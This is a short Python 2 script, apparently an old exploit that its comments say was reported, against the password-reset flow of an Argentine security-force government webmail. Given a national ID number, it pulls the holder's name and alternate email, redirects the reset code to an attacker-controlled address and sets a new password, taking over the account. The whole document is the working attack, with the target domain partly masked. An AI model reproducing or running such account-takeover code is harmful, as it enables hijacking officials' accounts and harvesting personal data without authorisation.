# old stuffs
# vulnerabilidad en webcorreo fuerza de seguridad gob.ar pass reset reportado

#!/usr/bin/env python
import sys
import requests
import json

dni = sys.argv[1]
email = "g********@disbox.org" # no estan llegando en protonmail
newpass = "Pwn3d2***"

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

print "D.N.I: "+dni
print "Chequeando si existe..."

data = {"usuario": dni}
req = requests.post("https://****.gob.ar/recuperarpass/control_usr_mail", headers=headers, data=data, verify=False)
res = json.loads(req.content)
if res['error'] == 0:
	print "Existe!"
	print "Nombre: "+res['name']
	if res['correo_alternativo'] != "":
		print "Correo alternativo: "+res['correo_alternativo']
	else:
		print "No tiene correo alternativo"

	print "Enviando codigo a tu email..."
	data = {"usuario": dni, "correo_alternativo": email}
	req = requests.post("https://://****.gob.ar/recuperarpass/enviar_codigo", data, verify=False)
	print req.content
	codigo = input("Codigo: ")
	data = {"codigo": codigo, "usuario": dni}
	req = requests.post("https://****.gob.ar/recuperarpass/control_codigo", data, verify=False)

	print "Cambiando pass..."
	res = json.loads(req.content)

	if res['error'] == 0:
		data = {"codigo": codigo, "usuario": dni, "pass_new": newpass, "pass_new2": newpass}
		req = requests.post("https://****.gob.ar/recuperarpass/cambiar_pass", data=data, verify=False)

		if "se ha restaurado correctamente" in req.content:
			print "Cambiada!!"
		else:
			print "Error de codigo"
else:
	print "No existe usuario con ese dni"


